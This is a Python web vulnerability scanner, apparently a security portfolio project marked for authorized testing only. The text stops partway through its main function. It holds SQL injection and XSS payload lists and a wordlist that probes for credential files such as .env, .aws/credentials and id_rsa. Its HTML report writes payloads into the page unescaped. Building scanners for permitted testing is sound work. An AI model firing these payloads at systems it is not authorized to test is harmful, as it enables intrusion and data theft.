#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebVulnX v2.0 - Advanced Web Application Vulnerability Scanner
===============================================================
Author : CyberSec Portfolio Project (Red Team Track)
Purpose: Authorized web application penetration testing ONLY.

Modules
-------
* Smart crawler (same-origin, depth-limited, form + parameter discovery)
* SQL Injection engine:
    - Error-based detection (30+ DBMS error signatures: MySQL, MSSQL,
      Oracle, PostgreSQL, SQLite, MSAccess, DB2)
    - Boolean-based blind (response similarity via difflib)
    - Time-based blind (SLEEP / WAITFOR / pg_sleep payloads)
* Reflected XSS engine (polyglot payloads + encoding bypasses)
* Directory / file brute-force (status + size aware)
* Security misconfig checks (headers, cookies, methods, server banner)
* Multi-format reporting (console, JSON, HTML)

LEGAL: Only test applications you own or have explicit permission to test.
"""

from __future__ import annotations

import argparse
import difflib
import json
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Dict, List, Optional, Set, Tuple
from html.parser import HTMLParser

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = r"""
 __      __     _   _   _   _  __   __
 \ \    / /__ _| | | | | | | \ \ / /__ _ _   _ _ __ _  _
  \ \/\/ / _ \ _| | | |_| | | \ V / _ \ | | | | '__| || |
   \_/\_/\___/_|_|  \___/|_|  \_/ \___/_,_|_|_|_|   \_, |
                                                     |__/   v2.0
  Advanced Web Application Vulnerability Scanner
"""

C = {
    "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
    "blue": "\033[94m", "cyan": "\033[96m", "magenta": "\033[95m",
    "bold": "\033[1m", "dim": "\033[2m", "reset": "\033[0m",
}


def colorize(t: str, c: str) -> str:
    return t if not sys.stdout.isatty() else f"{C.get(c, '')}{t}{C['reset']}"


def info(m): print(f"{colorize('[*]', 'blue')} {m}")
def ok(m):   print(f"{colorize('[+]', 'green')} {m}")
def warn(m): print(f"{colorize('[!]', 'yellow')} {m}")
def fail(m): print(f"{colorize('[-]', 'red')} {m}")
def vuln(m): print(f"{colorize('[VULN]', 'red')}{colorize(' ' + m, 'bold')}")


# ============================================================================
# Signature database
# ============================================================================
SQL_ERRORS: List[Tuple[re.Pattern, str]] = [
    (re.compile(r"you have an error in your sql syntax", re.I), "MySQL"),
    (re.compile(r"warning.*mysql_", re.I), "MySQL"),
    (re.compile(r"unclosed quotation mark after the character string", re.I), "MSSQL"),
    (re.compile(r"microsoft ole db provider for sql server", re.I), "MSSQL"),
    (re.compile(r"\[microsoft\]\[odbc sql server driver\]", re.I), "MSSQL"),
    (re.compile(r"microsoft access driver", re.I), "MSAccess"),
    (re.compile(r"jet database engine", re.I), "MSAccess"),
    (re.compile(r"oracle error", re.I), "Oracle"),
    (re.compile(r"ora-\d{5}", re.I), "Oracle"),
    (re.compile(r"quoted string not properly terminated", re.I), "Oracle"),
    (re.compile(r"pg_query\(\)|pg_exec\(\)|PostgreSQL.*ERROR", re.I), "PostgreSQL"),
    (re.compile(r"unterminated quoted string", re.I), "PostgreSQL"),
    (re.compile(r"sqlite3?\.?(error|exception)", re.I), "SQLite"),
    (re.compile(r"sqlite error|near \".*\": syntax error", re.I), "SQLite"),
    (re.compile(r"sql syntax.*near", re.I), "MySQL/PostgreSQL"),
    (re.compile(r"syntax error.*unexpected", re.I), "DB2/SQLite"),
    (re.compile(r"db2 sql error", re.I), "DB2"),
    (re.compile(r"sqlite3\.OperationalError", re.I), "SQLite"),
    (re.compile(r"Informix.*error", re.I), "Informix"),
    (re.compile(r"org\.hibernate|jdbc\.", re.I), "Java JDBC"),
    (re.compile(r"sqlstate\[", re.I), "Generic (SQLSTATE)"),
    (re.compile(r"PDOException", re.I), "PHP PDO"),
    (re.compile(r"supplied argument is not a valid mysql", re.I), "MySQL"),
]

SQL_PAYLOADS_ERROR = [
    "'", "\"", "')", "\")", "' OR '1'='1", "' OR '1'='1' -- ",
    "1' ORDER BY 100--", "1 AND 1=1", "1' AND '1'='2", "1 UNION SELECT NULL--",
    "1; WAITFOR DELAY '0:0:0'--", "'||(SELECT '')||'", "1') AND ('1'='1",
    "\" OR \"\"=\"", "1 AND 1=CONVERT(int,@@version)--",
]

SQL_BOOLEAN_TRUE = ["' OR 1=1-- ", "\" OR 1=1-- ", "1 OR 1=1", "') OR ('1'='1"]
SQL_BOOLEAN_FALSE = ["' OR 1=2-- ", "\" OR 1=2-- ", "1 OR 1=2", "') OR ('1'='2"]

SQL_TIME_PAYLOADS = [
    ("MySQL/PostgreSQL", "' OR SLEEP({d})-- "),
    ("MySQL/PostgreSQL", "1; SELECT SLEEP({d})-- "),
    ("MySQL/PostgreSQL", "' AND SLEEP({d}) AND '1'='1"),
    ("MSSQL", "'; WAITFOR DELAY '0:0:{d}'-- "),
    ("MSSQL", "1); WAITFOR DELAY '0:0:{d}'-- "),
    ("PostgreSQL", "'; SELECT pg_sleep({d})-- "),
    ("Oracle", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{d})-- "),
    ("SQLite", "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({d}00000000))))-- "),
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<img src=x onerror=alert("XSS")>',
    '"><img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '"><svg onload=alert("XSS")>',
    "<body onload=alert('XSS')>",
    '"><iframe src="javascript:alert(`XSS`)">',
    "{{constructor.constructor('alert(1)')()}}",
    '<details open ontoggle=alert("XSS")>',
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    '<math><mtext></mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
]

XSS_CONFIRM_RX = re.compile(r"alert\((['\"`]?)(XSS|1|String\.fromCharCode\(88,83,83\))\1\)", re.I)

SEC_HEADERS = {
    "Strict-Transport-Security": "Missing HSTS (session hijacking risk on HTTP)",
    "Content-Security-Policy": "Missing CSP (XSS impact increased)",
    "X-Content-Type-Options": "Missing X-Content-Type-Options (MIME sniffing)",
    "X-Frame-Options": "Missing X-Frame-Options (clickjacking)",
    "Referrer-Policy": "Missing Referrer-Policy (information leak)",
    "Permissions-Policy": "Missing Permissions-Policy",
}

DEFAULT_DIRS = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php", "phpmyadmin",
    "backup", "backups", "db", "database", "config", "config.php", "config.bak",
    ".git", ".git/HEAD", ".git/config", ".env", ".htaccess", ".svn", ".DS_Store",
    "robots.txt", "sitemap.xml", "server-status", "server-info", "actuator",
    "actuator/health", "actuator/env", "api", "api/v1", "api/v2", "graphql",
    "console", "debug", "test", "testing", "tmp", "temp", "upload", "uploads",
    "files", "static", "assets", "images", "img", "css", "js", "includes",
    "cgi-bin", "manager", "manager/html", "webadmin", "cpanel", "phpinfo.php",
    "info.php", "test.php", "shell.php", "cmd.php", "eval.php", "admin.php",
    "login.php", "index.php.bak", "index.php~", "web.config", "WEB-INF/web.xml",
    "composer.json", "package.json", ".aws/credentials", "id_rsa", "dump.sql",
    "backup.sql", "backup.zip", "backup.tar.gz", "site.zip", "www.zip",
    "trace.axd", "elmah.axd", "adminer.php", "jmx-console", "invoker/JMXInvokerServlet",
    "swagger-ui.html", "swagger.json", "openapi.json", "graphql/console",
    "remote/login", "owa", "autodiscover", "exchange", "elmah", ".well-known/security.txt",
]

SKIP_EXT = {".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2",
            ".ttf", ".eot", ".mp4", ".mp3", ".zip", ".gz", ".tar", ".rar",
            ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".css", ".js", ".map"}


# ============================================================================
# Data models
# ============================================================================
@dataclass
class Finding:
    vuln_type: str
    severity: str            # Critical / High / Medium / Low / Info
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    detail: str = ""
    cvss_hint: float = 0.0

    def __str__(self) -> str:
        p = f" [{self.parameter}]" if self.parameter else ""
        return f"{self.severity:<8} {self.vuln_type}{p} @ {self.url}"


@dataclass
class ScanState:
    base_url: str = ""
    findings: List[Finding] = field(default_factory=list)
    crawled_urls: Set[str] = field(default_factory=set)
    forms: List[Dict] = field(default_factory=list)
    params: Dict[str, Set[str]] = field(default_factory=dict)   # url -> params
    start_ts: float = 0.0

    def add(self, f: Finding) -> None:
        key = (f.vuln_type, f.url, f.parameter, f.payload)
        if any((x.vuln_type, x.url, x.parameter, x.payload) == key for x in self.findings):
            return
        self.findings.append(f)
        sev = f.severity.upper()
        tag = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow",
               "LOW": "cyan", "INFO": "blue"}.get(sev, "blue")
        vuln(f"[{colorize(f.severity, tag)}] {f.vuln_type}"
             + (f" [{f.parameter}]" if f.parameter else "")
             + f" -> {f.url}")
        if f.evidence:
            print(f"        {colorize('evidence: ' + f.evidence[:100], 'dim')}")


# ============================================================================
# HTML parsing (stdlib — no bs4 required)
# ============================================================================
class LinkFormParser(HTMLParser):
    def __init__(self, base: str):
        super().__init__()
        self.base = base
        self.links: List[str] = []
        self.forms: List[Dict] = []
        self._form: Optional[Dict] = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "a" and a.get("href"):
            self.links.append(a["href"])
        elif tag == "form":
            self._form = {
                "action": a.get("action", ""),
                "method": (a.get("method") or "get").lower(),
                "inputs": [],
            }
        elif tag in ("input", "textarea", "select") and self._form is not None:
            self._form["inputs"].append({
                "name": a.get("name", ""),
                "type": (a.get("type") or "text").lower(),
                "value": a.get("value", ""),
            })
        elif tag == "script" and a.get("src"):
            self.links.append(a["src"])

    def handle_endtag(self, tag):
        if tag == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None


# ============================================================================
# HTTP layer
# ============================================================================
class HttpClient:
    def __init__(self, timeout: float = 10.0, delay: float = 0.0,
                 user_agent: str = "WebVulnX/2.0 (Authorized Security Testing)",
                 cookies: Optional[Dict] = None, headers: Optional[Dict] = None,
                 proxy: Optional[str] = None, verify: bool = False):
        self.sess = requests.Session()
        self.sess.verify = verify
        self.sess.headers.update({
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        if headers:
            self.sess.headers.update(headers)
        if cookies:
            self.sess.cookies.update(cookies)
        if proxy:
            self.sess.proxies = {"http": proxy, "https": proxy}
        self.timeout = timeout
        self.delay = delay

    def request(self, method: str, url: str, **kw) -> Optional[requests.Response]:
        if self.delay:
            time.sleep(self.delay)
        kw.setdefault("timeout", self.timeout)
        kw.setdefault("allow_redirects", True)
        try:
            return self.sess.request(method, url, **kw)
        except requests.RequestException:
            return None

    def get(self, url: str, **kw):
        return self.request("GET", url, **kw)


def normalize_url(u: str) -> str:
    u = u.split("#")[0]
    p = urllib.parse.urlsplit(u)
    path = re.sub(r"/{2,}", "/", p.path or "/")
    return urllib.parse.urlunsplit((p.scheme, p.netloc, path, p.query, ""))


def same_origin(a: str, b: str) -> bool:
    pa, pb = urllib.parse.urlsplit(a), urllib.parse.urlsplit(b)
    return pa.netloc == pb.netloc and pa.scheme == pb.scheme


# ============================================================================
# Module 1 — Crawler
# ============================================================================
class Crawler:
    def __init__(self, client: HttpClient, state: ScanState, max_depth: int = 3,
                 max_urls: int = 150):
        self.client = client
        self.state = state
        self.max_depth = max_depth
        self.max_urls = max_urls

    def run(self, start: str) -> None:
        info(f"Crawling {start} (depth={self.max_depth}, max_urls={self.max_urls})")
        queue: List[Tuple[str, int]] = [(normalize_url(start), 0)]
        seen: Set[str] = set()

        while queue and len(self.state.crawled_urls) < self.max_urls:
            url, depth = queue.pop(0)
            if url in seen or depth > self.max_depth:
                continue
            seen.add(url)

            resp = self.client.get(url)
            if resp is None:
                continue

            self.state.crawled_urls.add(url)
            ct = resp.headers.get("Content-Type", "")
            if "html" not in ct and not resp.text[:200].lower().startswith(("<!doctype", "<html")):
                continue

            # Record query params
            qs = urllib.parse.urlsplit(url).query
            if qs:
                self.state.params.setdefault(url, set()).update(
                    urllib.parse.parse_qs(qs, keep_blank_values=True).keys()
                )

            parser = LinkFormParser(url)
            try:
                parser.feed(resp.text)
            except Exception:
                continue

            for link in parser.links:
                absu = urllib.parse.urljoin(resp.url, link)
                absu = normalize_url(absu.split("?")[0]) if "?" not in absu else normalize_url(absu)
                if same_origin(start, absu) and absu not in seen:
                    if urllib.parse.urlsplit(absu).path.lower().endswith(tuple(SKIP_EXT)):
                        continue
                    queue.append((absu, depth + 1))
                    # Also record params on queued URLs
                    qs2 = urllib.parse.urlsplit(absu).query
                    if qs2:
                        self.state.params.setdefault(absu, set()).update(
                            urllib.parse.parse_qs(qs2, keep_blank_values=True).keys()
                        )

            for form in parser.forms:
                action = urllib.parse.urljoin(resp.url, form["action"] or resp.url)
                form["url"] = normalize_url(action)
                names = [i["name"] for i in form["inputs"] if i["name"]]
                self.state.forms.append(form)
                if names:
                    self.state.params.setdefault(form["url"], set()).update(names)

        ok(f"Crawl finished: {len(self.state.crawled_urls)} URLs, "
           f"{len(self.state.forms)} forms, "
           f"{sum(len(v) for v in self.state.params.values())} parameters")


# ============================================================================
# Module 2 — SQL Injection
# ============================================================================
class SqliScanner:
    """Error-based + Boolean-blind + Time-based SQLi detection."""

    def __init__(self, client: HttpClient, state: ScanState, time_delay: float = 5.0):
        self.client = client
        self.state = state
        self.time_delay = time_delay

    # -- helpers -------------------------------------------------------------
    @staticmethod
    def _match_error(body: str) -> Optional[str]:
        for rx, dbms in SQL_ERRORS:
            if rx.search(body):
                return dbms
        return None

    @staticmethod
    def _similarity(a: str, b: str) -> float:
        return difflib.SequenceMatcher(None, a[:4000], b[:4000]).ratio()

    def _inject_params(self, url: str, method: str = "GET",
                       data: Optional[Dict] = None, param: Optional[str] = None
                       ) -> List[Dict]:
        """Yield (param, payload, request-kwargs) candidates."""
        return []

    def _send(self, url: str, method: str, param: str, payload: str,
              base_params: Dict[str, str], baseline_body: str
              ) -> Optional[requests.Response]:
        params = dict(base_params)
        params[param] = payload
        # NOTE: strip any existing query string — we rebuild it from params,
        # otherwise requests would append (&id=1&id=payload) and the server
        # would read the original value first.
        parsed = urllib.parse.urlsplit(url)
        clean = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
        if method.upper() == "GET":
            return self.client.get(clean, params=params)
        return self.client.request("POST", clean, data=params)

    # -- GET/POST parameter attack -------------------------------------------
    def scan_params(self, url: str, params: List[str], method: str = "GET",
                    base_params: Optional[Dict[str, str]] = None) -> None:
        base_params = base_params or {p: "1" for p in params}
        parsed = urllib.parse.urlsplit(url)
        clean = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
        # Baseline
        if method.upper() == "GET":
            base_resp = self.client.get(clean, params=base_params)
        else:
            base_resp = self.client.request("POST", clean, data=base_params)
        if base_resp is None:
            return
        baseline = base_resp.text

        for param in params:
            info(f"SQLi tests on {url} [{param}] ({method})")
            tested_error = False

            # --- 1. Error-based ---
            for payload in SQL_PAYLOADS_ERROR:
                resp = self._send(url, method, param, payload, base_params, baseline)
                if resp is None:
                    continue
                dbms = self._match_error(resp.text)
                if dbms:
                    self.state.add(Finding(
                        vuln_type="SQL Injection (Error-Based)",
                        severity="Critical", url=url, parameter=param,
                        payload=payload,
                        evidence=f"DBMS signature: {dbms}",
                        detail="Server returned a database error message indicating "
                               "the input is concatenated into a SQL query unsafely.",
                        cvss_hint=9.8,
                    ))
                    tested_error = True
                    break

            # --- 2. Boolean-based blind ---
            if not tested_error:
                t_resp = self._send(url, method, param, SQL_BOOLEAN_TRUE[0], base_params, baseline)
                f_resp = self._send(url, method, param, SQL_BOOLEAN_FALSE[0], base_params, baseline)
                if t_resp is not None and f_resp is not None:
                    sim_t = self._similarity(baseline, t_resp.text)
                    sim_f = self._similarity(baseline, f_resp.text)
                    sim_tf = self._similarity(t_resp.text, f_resp.text)
                    if (sim_t > 0.90 and sim_f < 0.85) or \
                       (sim_f > 0.90 and sim_t < 0.85) or \
                       (sim_tf < 0.75 and abs(sim_t - sim_f) > 0.15):
                        self.state.add(Finding(
                            vuln_type="SQL Injection (Boolean-Based Blind)",
                            severity="High", url=url, parameter=param,
                            payload=f"TRUE={SQL_BOOLEAN_TRUE[0]} / FALSE={SQL_BOOLEAN_FALSE[0]}",
                            evidence=f"similarity baseline/true={sim_t:.2f} "
                                     f"baseline/false={sim_f:.2f} true/false={sim_tf:.2f}",
                            detail="Responses differ significantly between TRUE and FALSE "
                                   "boolean conditions — classic blind SQLi behavior.",
                            cvss_hint=8.6,
                        ))

            # --- 3. Time-based blind (skip if already confirmed by errors) ---
            if not tested_error:
                payloads = [(name, tpl.format(d=int(self.time_delay)))
                            for name, tpl in SQL_TIME_PAYLOADS]
                for dbms, payload in payloads:
                    t0 = time.time()
                    resp = self._send(url, method, param, payload, base_params, baseline)
                    elapsed = time.time() - t0
                    if resp is not None and elapsed >= self.time_delay - 0.5:
                        self.state.add(Finding(
                            vuln_type="SQL Injection (Time-Based Blind)",
                            severity="High", url=url, parameter=param,
                            payload=payload,
                            evidence=f"response delayed {elapsed:.1f}s (expected {int(self.time_delay)}s) "
                                     f"— engine hint: {dbms}",
                            detail="The server response was delayed only when a time-based SQL "
                                   "payload was injected, indicating injectable query.",
                            cvss_hint=8.6,
                        ))
                        break

    # -- URL path injection ----------------------------------------------------
    def scan_path(self, url: str) -> None:
        """Test /item/123 style segments with numeric ids."""
        parsed = urllib.parse.urlsplit(url)
        segs = [s for s in parsed.path.split("/") if s]
        for i, seg in enumerate(segs):
            if re.fullmatch(r"\d+", seg):
                info(f"SQLi path test on {url} (segment '{seg}')")
                for payload in ("1'", "1 AND 1=1", "1 AND 1=2", "1 UNION SELECT NULL"):
                    new_segs = segs[:]
                    new_segs[i] = payload.replace(" ", "%20")
                    new_path = "/" + "/".join(new_segs)
                    test_url = urllib.parse.urlunsplit(
                        (parsed.scheme, parsed.netloc, new_path, parsed.query, "")
                    )
                    resp = self.client.get(test_url)
                    if resp is not None:
                        dbms = self._match_error(resp.text)
                        if dbms:
                            self.state.add(Finding(
                                vuln_type="SQL Injection (Error-Based, URL path)",
                                severity="Critical", url=test_url,
                                parameter=f"path-segment-{i}", payload=payload,
                                evidence=f"DBMS signature: {dbms}",
                                detail="Numeric URL path segment is SQL-injectable.",
                                cvss_hint=9.8,
                            ))
                            break

    def run(self) -> None:
        # Query-string params
        for url, params in list(self.state.params.items()):
            if params:
                self.scan_params(url, sorted(params), method="GET")
        # Forms
        for form in self.state.forms:
            names = [i["name"] for i in form["inputs"] if i["name"]
                     and i["type"] not in ("submit", "button", "image", "file", "reset")]
            if not names:
                continue
            base = {n: "test" for n in names}
            self.scan_params(form["url"], names, method=form["method"], base_params=base)
        # Path-based IDs
        for url in list(self.state.crawled_urls):
            self.scan_path(url)


# ============================================================================
# Module 3 — Reflected XSS
# ============================================================================
class XssScanner:
    def __init__(self, client: HttpClient, state: ScanState):
        self.client = client
        self.state = state

    @staticmethod
    def _is_reflected(payload: str, body: str) -> Tuple[bool, bool]:
        """Returns (raw_reflected, executable)."""
        raw = payload in body
        exec_ = bool(XSS_CONFIRM_RX.search(body)) or (
            payload.lower().startswith("<script") and payload in body
        )
        return raw, exec_

    def _test_target(self, url: str, method: str, param: str,
                     base_params: Dict[str, str]) -> None:
        parsed = urllib.parse.urlsplit(url)
        clean = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
        for payload in XSS_PAYLOADS:
            params = dict(base_params)
            params[param] = payload
            if method.upper() == "GET":
                resp = self.client.get(clean, params=params)
            else:
                resp = self.client.request("POST", clean, data=params)
            if resp is None:
                continue
            raw, exec_ = self._is_reflected(payload, resp.text)
            if exec_:
                self.state.add(Finding(
                    vuln_type="Reflected XSS (Executable)",
                    severity="High", url=url, parameter=param, payload=payload,
                    evidence="payload reflected and rendered as active HTML/JS",
                    detail="The application reflects user input into the page without "
                           "adequate encoding — script execution is possible.",
                    cvss_hint=7.4,
                ))
                return
            if raw:
                self.state.add(Finding(
                    vuln_type="Reflected XSS (Reflected, encoding dependent)",
                    severity="Medium", url=url, parameter=param, payload=payload,
                    evidence="payload reflected verbatim into the response body",
                    detail="Input is reflected without sanitization; exploitability depends "
                           "on where it lands in the HTML context.",
                    cvss_hint=5.4,
                ))
                return

    def run(self) -> None:
        for url, params in list(self.state.params.items()):
            if params:
                info(f"XSS tests on {url} params={sorted(params)}")
                self._test_target(url, "GET", sorted(params)[0], {p: "1" for p in params})
                for p in sorted(params)[1:]:
                    self._test_target(url, "GET", p, {q: "1" for q in params})
        for form in self.state.forms:
            names = [i["name"] for i in form["inputs"] if i["name"]
                     and i["type"] not in ("submit", "button", "image", "file", "reset")]
            if not names:
                continue
            info(f"XSS tests on form {form['url']} ({form['method']})")
            for n in names:
                self._test_target(form["url"], form["method"], n,
                                  {x: "test" for x in names})


# ============================================================================
# Module 4 — Directory brute-force
# ============================================================================
class DirBuster:
    def __init__(self, client: HttpClient, state: ScanState, wordlist: List[str]):
        self.client = client
        self.state = state
        self.wordlist = wordlist

    def run(self, base: str) -> None:
        base = base if base.endswith("/") else base + "/"
        info(f"Directory brute-force: {len(self.wordlist)} entries")
        interesting = {200, 201, 204, 301, 302, 307, 401, 403, 500}
        for word in self.wordlist:
            url = urllib.parse.urljoin(base, word.strip().lstrip("/"))
            resp = self.client.get(url, allow_redirects=False)
            if resp is None:
                continue
            if resp.status_code in interesting:
                size = len(resp.content)
                loc = resp.headers.get("Location", "")
                note = f" -> {loc}" if loc else ""
                sev = "Medium" if resp.status_code in (200, 201, 500) else "Low"
                # .git/.env/backup hits are higher severity
                if any(x in word for x in (".git", ".env", ".aws", "id_rsa",
                                           "dump.sql", "backup", ".htaccess",
                                           "web.config", "phpinfo")):
                    sev = "High" if resp.status_code == 200 else "Medium"
                self.state.add(Finding(
                    vuln_type="Sensitive Path Exposed" if sev in ("High", "Medium")
                              else "Hidden Path Found",
                    severity=sev, url=url,
                    evidence=f"HTTP {resp.status_code}, {size} bytes{note}",
                    detail="A potentially sensitive or hidden resource is accessible.",
                    cvss_hint=5.0 if sev == "High" else 3.0,
                ))


# ============================================================================
# Module 5 — Security misconfiguration audit
# ============================================================================
class MisconfigAudit:
    def __init__(self, client: HttpClient, state: ScanState):
        self.client = client
        self.state = state

    def run(self, base: str) -> None:
        info("Auditing security headers & cookies")
        resp = self.client.get(base)
        if resp is None:
            return

        for header, desc in SEC_HEADERS.items():
            if header not in resp.headers:
                self.state.add(Finding(
                    vuln_type="Missing Security Header", severity="Low", url=base,
                    parameter=header, evidence=f"{header} not present",
                    detail=desc, cvss_hint=3.0,
                ))

        srv = resp.headers.get("Server", "")
        if srv:
            self.state.add(Finding(
                vuln_type="Server Banner Disclosure", severity="Info", url=base,
                evidence=f"Server: {srv}",
                detail="The server discloses its software/version — aids targeted attacks.",
                cvss_hint=2.0,
            ))
        xp = resp.headers.get("X-Powered-By", "")
        if xp:
            self.state.add(Finding(
                vuln_type="Technology Disclosure", severity="Info", url=base,
                evidence=f"X-Powered-By: {xp}",
                detail="Framework/technology fingerprint exposed.",
                cvss_hint=2.0,
            ))

        for cookie in resp.cookies:
            issues = []
            if not cookie.secure:
                issues.append("missing Secure")
            if "httponly" not in str(getattr(cookie, "_rest", {})).lower() \
               and not getattr(cookie, "has_nonstandard_attr", lambda *_: False)("HttpOnly"):
                issues.append("missing HttpOnly")
            if issues:
                self.state.add(Finding(
                    vuln_type="Insecure Cookie Flags", severity="Low", url=base,
                    parameter=cookie.name,
                    evidence=f"Set-Cookie '{cookie.name}': {', '.join(issues)}",
                    detail="Cookies without Secure/HttpOnly flags are exposed to theft.",
                    cvss_hint=3.5,
                ))

        # HTTP methods
        for method in ("OPTIONS", "TRACE", "PUT", "DELETE"):
            r = self.client.request(method, base)
            if r is not None and r.status_code in (200, 204, 501) and method in ("TRACE", "PUT", "DELETE"):
                self.state.add(Finding(
                    vuln_type="Dangerous HTTP Method Enabled", severity="Medium",
                    url=base, parameter=method,
                    evidence=f"{method} allowed (HTTP {r.status_code})",
                    detail="Verb tampering / cross-site tracing may be possible.",
                    cvss_hint=5.0,
                ))

        # robots.txt / security.txt
        for path in ("robots.txt", "security.txt", ".well-known/security.txt"):
            r = self.client.get(urllib.parse.urljoin(base, path))
            if r is not None and r.status_code == 200 and r.text.strip():
                self.state.add(Finding(
                    vuln_type="Information File Present", severity="Info",
                    url=urllib.parse.urljoin(base, path),
                    evidence=f"{len(r.text)} bytes — may leak hidden paths",
                    detail="Review contents for sensitive directory disclosure.",
                    cvss_hint=1.0,
                ))


# ============================================================================
# Reporting
# ============================================================================
def write_json_report(state: ScanState, path: str) -> None:
    data = {
        "tool": "WebVulnX v2.0",
        "target": state.base_url,
        "scanned_at": datetime.now(timezone.utc).isoformat(),
        "duration_s": round(time.time() - state.start_ts, 2),
        "stats": {
            "urls_crawled": len(state.crawled_urls),
            "forms": len(state.forms),
            "findings": len(state.findings),
        },
        "findings": [asdict(f) for f in state.findings],
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2, ensure_ascii=False)
    ok(f"JSON report: {path}")


def write_html_report(state: ScanState, path: str) -> None:
    sev_color = {"Critical": "#ff4d4d", "High": "#ff7a45", "Medium": "#faad14",
                 "Low": "#36cfc9", "Info": "#597ef7"}
    rows = "".join(
        f"<tr><td style='color:{sev_color.get(f.severity,'#ccc')};font-weight:600'>{f.severity}</td>"
        f"<td>{f.vuln_type}</td><td>{f.parameter or '-'}</td>"
        f"<td><a style='color:#58a6ff' href='{f.url}'>{f.url}</a></td>"
        f"<td><code>{f.payload or '-'}</code></td>"
        f"<td><code>{(f.evidence or '-')[:120]}</code></td></tr>"
        for f in sorted(state.findings,
                        key=lambda x: ["Critical", "High", "Medium", "Low", "Info"].index(x.severity))
    )
    html = f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>WebVulnX Report</title>
<style>
body{{font-family:Segoe UI,Arial;background:#0d1117;color:#c9d1d9;padding:24px}}
h1{{color:#58a6ff}} h2{{color:#7ee787}}
table{{border-collapse:collapse;width:100%;margin-top:12px}}
th,td{{border:1px solid #30363d;padding:8px;font-size:13px;text-align:left;vertical-align:top}}
th{{background:#161b22;color:#58a6ff}} code{{color:#7ee787}}
.meta{{color:#8b949e}} .badge{{display:inline-block;padding:2px 10px;border-radius:10px;
background:#161b22;margin-right:8px;border:1px solid #30363d}}
</style></head><body>
<h1>WebVulnX v2.0 &mdash; Vulnerability Report</h1>
<p class="meta">Target: <b>{state.base_url}</b> | Generated: {datetime.now(timezone.utc).isoformat()}</p>
<p>
<span class="badge">URLs: {len(state.crawled_urls)}</span>
<span class="badge">Forms: {len(state.forms)}</span>
<span class="badge">Findings: {len(state.findings)}</span>
</p>
<h2>Findings</h2>
<table><tr><th>Severity</th><th>Type</th><th>Parameter</th><th>URL</th><th>Payload</th><th>Evidence</th></tr>
{rows or '<tr><td colspan=6>No findings 🎉</td></tr>'}
</table></body></html>"""
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(html)
    ok(f"HTML report: {path}")


def load_wordlist(path: Optional[str]) -> List[str]:
    if path:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                return [l.strip() for l in fh if l.strip() and not l.startswith("#")]
        except OSError:
            fail(f"Wordlist not found: {path} — using built-in list")
    return DEFAULT_DIRS


# ============================================================================
# CLI / orchestration
# ============================================================================
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="webvulnx",
        description="WebVulnX v2.0 - Advanced Web Application Vulnerability Scanner",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 webvulnx.py -u https://target.example --full\n"
            "  python3 webvulnx.py -u https://target.example/app --sqli --xss\n"
            "  python3 webvulnx.py -u https://target.example --dirs -w wordlists/dirs.txt\n"
            "  python3 webvulnx.py -u https://target.example --full --json reports/r.json\n\n"
            "LEGAL: Only test applications you are authorized to assess."
        ),
    )
    p.add_argument("-u", "--url", required=True, help="Target base URL")
    p.add_argument("--full", action="store_true", help="Enable all modules")
    p.add_argument("--crawl", action="store_true", help="Crawl only")
    p.add_argument("--sqli", action="store_true", help="SQL injection tests")
    p.add_argument("--xss", action="store_true", help="XSS tests")
    p.add_argument("--dirs", action="store_true", help="Directory brute-force")
    p.add_argument("--audit", action="store_true", help="Misconfiguration audit")
    p.add_argument("-w", "--wordlist", help="Wordlist file for directory busting")
    p.add_argument("-d", "--depth", type=int, default=3, help="Crawl depth [3]")
    p.add_argument("--max-urls", type=int, default=150, help="Max crawled URLs [150]")
    p.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout [10]")
    p.add_argument("--delay", type=float, default=0.0, help="Delay between requests [0]")
    p.add_argument("--time-blind", type=float, default=5.0,
                   help="Seconds for time-based SQLi [5]")
    p.add_argument("--cookie", help='Cookies, e.g. "PHPSESSID=abc; role=user"')
    p.add_argument("--header", action="append", default=[],
                   help='Extra header "Name: Value" (repeatable)')
    p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080")
    p.add_argument("--no-crawl", action="store_true", help="Skip crawling (test base URL only)")
    p.add_argument("--json", metavar="FILE", help="JSON report path")
    p.add_argument("--html", metavar="FILE", help="HTML report path")
    return p


def main() -> None:
    args = build_parser().parse_args()
    print(colorize(BANNER, "cyan"))
    warn("Authorized testing only — you are responsible for legal compliance.")

    if not (args.full or args.crawl or args.sqli or args.xss or args.dirs or args.audit):
        args.full = True

    # Headers / cookies
    extra_headers = {}
